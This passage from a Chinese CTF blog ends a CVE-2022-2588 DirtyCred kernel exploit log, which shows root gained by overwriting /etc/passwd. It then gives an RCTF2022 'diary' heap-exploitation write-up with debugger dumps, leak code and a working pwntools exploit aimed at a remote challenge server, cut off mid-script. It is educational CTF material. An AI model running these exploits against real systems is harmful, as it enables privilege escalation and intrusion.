cache</span><br><span class="line">[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[3] allocate the vulnerable filter</span><br><span class="line">[4] spray kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[6] 1st freed the filter object</span><br><span class="line">[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span><br><span class="line">[8] spray 4000 uprivileged `file`</span><br><span class="line">[9] 2nd free the filter object</span><br><span class="line">pause after 2nd free</span><br><span class="line">[10] spraying 5000 unprivileged `file`</span><br><span class="line">[10-1] found overlapped file, id : 22, 1930</span><br><span class="line">[11] start 2 threads compete to write</span><br><span class="line">[11-1] start slow write</span><br><span class="line">[11-2] write evil data after the slow write</span><br><span class="line">[12] got cmd, start spraying 4096*2 `file` by opening /etc/passwd</span><br><span class="line">[*] spray done</span><br><span class="line">[*] write done, spent 9.352879 s</span><br><span class="line">[13] check whether we overwrite the privileged file</span><br><span class="line">[+] succeed</span><br><span class="line"><span class="meta">$</span><span class="bash"> su hi</span></span><br><span class="line">Password: </span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(hi) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">hi:x:0:0:root:/:/bin/sh</span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/575931271">CVE-2022-2588 Double-free 漏洞 DirtyCred 利用</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/19/RCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/19/RCTF2022/" class="post-title-link" itemprop="url">RCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-19 17:49:21" itemprop="dateCreated datePublished" datetime="2022-12-19T17:49:21+08:00">2022-12-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-22 19:03:17" itemprop="dateModified" datetime="2022-12-22T19:03:17+08:00">2022-12-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>24k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>22 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">diary: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=f9a0df0117a1b0f105959590bb560a21554a17e2, stripped</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序的 “dele” 模块有点漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2022</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2021</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2020</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2019</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这里我们只释放了 chunk0，但 chunk3 也被释放了，并且堆块整体向上移动（如果我们释放最后一个 chunk，则是正常的）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555557f080</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555557f080</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555557f088</span> ◂— <span class="number">0x311</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555557f090</span> ◂— <span class="number">0x7e5550a0c0a1e1e</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555557f098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555557f0a0</span> —▸ <span class="number">0x555555580350</span> ◂— <span class="number">0x3232323220202020</span> (<span class="string">&#x27;    2222&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55555557f0a8</span> ◂— <span class="number">0x7e4550a0c0a1e1e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55555557f0b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55555557f0b8</span> —▸ <span class="number">0x555555580690</span> ◂— <span class="number">0x3333333320202020</span> (<span class="string">&#x27;    3333&#x27;</span>)</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555557f0c0</span> ◂— <span class="number">0x7e3550a0c0a1e1e</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55555557f0c8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55555557f0d0</span> —▸ <span class="number">0x5555555809d0</span> —▸ <span class="number">0x55555557fd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555557f0d8</span> ◂— <span class="number">0x7e3550a0c0a1e1e</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55555557f0e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55555557f0e8</span> —▸ <span class="number">0x5555555809d0</span> —▸ <span class="number">0x55555557fd00</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>程序可以控制前3个 chunk，利用第3个 chunk 就可以完成泄露</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>利用这个程序漏洞就可以完成泄露：</p>
<ul>
<li>泄露 heap_base：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2022</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2021</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2020</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2019</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2018</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2017</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2016</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x14390</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<ul>
<li>泄露 libc_base：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1802</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1801</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1800</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1809</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1808</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1807</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1806</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1805</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1804</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;9&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>注意观察此时的堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555557f080</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555557f080</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555557f088</span> ◂— <span class="number">0x311</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555557f090</span> ◂— <span class="number">0x709550a0c0a1e1e</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555557f098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555557f0a0</span> —▸ <span class="number">0x55555557fd00</span> ◂— <span class="number">0x3232323220202020</span> (<span class="string">&#x27;    2222&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55555557f0a8</span> ◂— <span class="number">0x708550a0c0a1e1e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55555557f0b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55555557f0b8</span> —▸ <span class="number">0x555555581730</span> —▸ <span class="number">0x7ffff7da9be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555582db0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555557f0c0</span> ◂— <span class="number">0x708550a0c0a1e1e</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55555557f0c8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55555557f0d0</span> —▸ <span class="number">0x555555581730</span> —▸ <span class="number">0x7ffff7da9be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555582db0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555557f0d8</span> ◂— <span class="number">0x711550a0c0a1e1e</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55555557f0e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55555557f0e8</span> —▸ <span class="number">0x555555581a70</span> —▸ <span class="number">0x555555581db0</span> —▸ <span class="number">0x5555555820f0</span> —▸ <span class="number">0x555555582430</span> ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x55555557f0f0</span> ◂— <span class="number">0x710550a0c0a1e1e</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x55555557f0f8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>chunk1 和 chunk2 都是 unsortedbin</li>
<li>也就是说，接下来程序在这个 unsortedbin 中申请的第一个 chunk 会被当做 chunkn，可以被“堆菜单”提供的各个函数控制</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">16</span>), <span class="number">0</span>, <span class="number">0x300</span>uLL);</span><br><span class="line"><span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">16</span>), <span class="string">&quot;    &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">len2 = <span class="number">0x2F0</span>;</span><br><span class="line"><span class="keyword">if</span> ( len &lt;= <span class="number">0x2F0</span> )</span><br><span class="line">  len2 = len;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">4LL</span>), a2, len2);</span><br></pre></td></tr></table></figure>
<ul>
<li>在“堆菜单”的 <code>update</code> 函数中，可以对 0x2F0 字节大小的空间进行控制</li>
<li>只要申请的 chunk 比 0x2F0 小，就可以完成堆溢出</li>
</ul>
<p>接下来的思路很简单，就是利用这个堆溢出来修改 <code>encrypt</code> 创建的 chunk：</p>
<ul>
<li><code>encrypt</code> 会对程序进行加密，然后把原来的数据存储在一个 chunk 中</li>
<li>只要覆盖了这个 chunk 中的数据，就可以在 <code>decrypt</code> 中把修改后的数据写回</li>
<li>于是我们直接 <code>encrypt</code> tcachebin 上的 chunk，把 <code>encrypt</code> chunk 修改为 <code>free_hook</code> 后使用 <code>decrypt</code> 放回</li>
</ul>
<p>这里的堆风水是比较困难的，因为 <code>memset</code> 会把 heap 上相当一部分的数据置空，导致程序出现段错误，因此在进行溢出的 chunk 后面就只能有 <code>encrypt</code> chunk</p>
<p>但在实际操作中又会遇到一些问题，溢出的字节数不够，只能在 <code>encrypt</code> chunk 上覆盖 <code>free_hook</code> 的前4字节，不能将完整的 <code>free_hook</code> 写入（不知道出题人设计好的）</p>
<p>这里我卡了很久，之后突然想到可以直接使用 <code>update</code> 来覆盖后4字节的值（程序会在 chunk 之前加上4个空格），然后就可以申请到 <code>free_hook</code> 了</p>
<p>最后记得在 “/bin/sh” 两端加上 “;” 进行间隔</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./diary&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x3e66)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your test cmd:\n&quot;</span>,<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">year, month, day, hour, minutes, second, content</span>):</span></span><br><span class="line">    cmd(<span class="string">b&#x27;add#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(year),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(month),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(day),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(hour),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(minutes),encoding = <span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(second),encoding = <span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    cmd(<span class="string">b&#x27;update#&#x27;</span>+ <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding = <span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;show#&#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;delete#&#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">idx, offset, length</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;encrypt#&#x27;</span>+<span class="built_in">str</span>(idx)+<span class="string">&#x27;#&#x27;</span>+<span class="built_in">str</span>(offset)+<span class="string">&#x27;#&#x27;</span>+<span class="built_in">str</span>(length))</span><br><span 